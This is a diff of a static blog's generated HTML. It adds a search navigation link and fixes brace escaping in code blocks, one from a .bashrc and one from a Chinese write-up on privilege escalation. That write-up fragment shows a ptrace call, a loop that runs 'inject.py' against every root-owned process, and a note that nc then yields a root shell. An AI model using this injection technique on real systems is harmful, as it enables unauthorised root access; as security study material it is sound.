@@ -98,6 +98,8 @@
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
        --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
      -->
       </ul>
     </span>
@@ -330,7 +332,7 @@ shopt -s checkwinsize
 [ -x /usr/bin/lesspipe ] &amp;&amp; eval "$(SHELL=/bin/sh lesspipe)"
 
 # set variable identifying the chroot you work in (used in the prompt below)
-if [ -z "$<span class="token entity" title="&#123;">&amp;#123;</span>debian_chroot:-<span class="token entity" title="&#125;">&amp;#125;</span>" ] &amp;&amp; [ -r /etc/debian_chroot ]; then
+if [ -z "${debian_chroot:-}" ] &amp;&amp; [ -r /etc/debian_chroot ]; then
     debian_chroot=$(cat /etc/debian_chroot)
 fi
 
@@ -356,16 +358,16 @@ if [ -n "$force_color_prompt" ]; then
 fi
 
 if [ "$color_prompt" = yes ]; then
-    PS1='$<span class="token entity" title="&#123;">&amp;#123;</span>debian_chroot:+($debian_chroot)<span class="token entity" title="&#125;">&amp;#125;</span>\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
 else
-    PS1='$<span class="token entity" title="&#123;">&amp;#123;</span>debian_chroot:+($debian_chroot)<span class="token entity" title="&#125;">&amp;#125;</span>\u@\h:\w\$ '
+    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
 fi
 unset color_prompt force_color_prompt
 
 # If this is an xterm set the title to user@host:dir
 case "$TERM" in
 xterm*|rxvt*)
-    PS1="\[\e]0;$<span class="token entity" title="&#123;">&amp;#123;</span>debian_chroot:+($debian_chroot)<span class="token entity" title="&#125;">&amp;#125;</span>\u@\h: \w\a\]$PS1"
+    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
     ;;
 *)
     ;;
@@ -545,7 +547,7 @@ libc<span class="token punctuation">.</span>ptrace<span class="token punctuation
 libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_DETACH<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> None<span class="token punctuation">,</span> None<span class="token punctuation">)</span>
 </code></pre>
 <p>但是不是每一个进程都能成功的，所以利用：</p>
-<pre class=" language-bash"><code class="language-bash"><span class="token keyword">for</span> i <span class="token keyword">in</span> `ps -ef<span class="token operator">|</span><span class="token function">grep</span> root<span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">"grep"</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&amp;#123;print <span class="token variable">$2</span>&amp;#125;'</span>`<span class="token punctuation">;</span> <span class="token keyword">do</span> python2.7 inject.py <span class="token variable">$i</span><span class="token punctuation">;</span> <span class="token keyword">done</span>
+<pre class=" language-bash"><code class="language-bash"><span class="token keyword">for</span> i <span class="token keyword">in</span> `ps -ef<span class="token operator">|</span><span class="token function">grep</span> root<span class="token operator">|</span><span class="token function">grep</span> -v <span class="token string">"grep"</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span>`<span class="token punctuation">;</span> <span class="token keyword">do</span> python2.7 inject.py <span class="token variable">$i</span><span class="token punctuation">;</span> <span class="token keyword">done</span>
 </code></pre>
 <p>循环跑，就是环境可能会出问题吧</p>
 <p>然后用nc连接即可返回root权限账号</p>
@@ -579,6 +581,8 @@ libc<span class="token punctuation">.</span>ptrace<span class="token punctuation
           <li><a href="/categories/">分类</a></li>
         
           <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
         
       </ul>
     </div>
@@ -641,6 +645,8 @@ libc<span class="token punctuation">.</span>ptrace<span class="token punctuation
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    --><!--
+      --><li><a href="/search/">搜索</a></li><!--
     -->
       </ul>
       <ul>
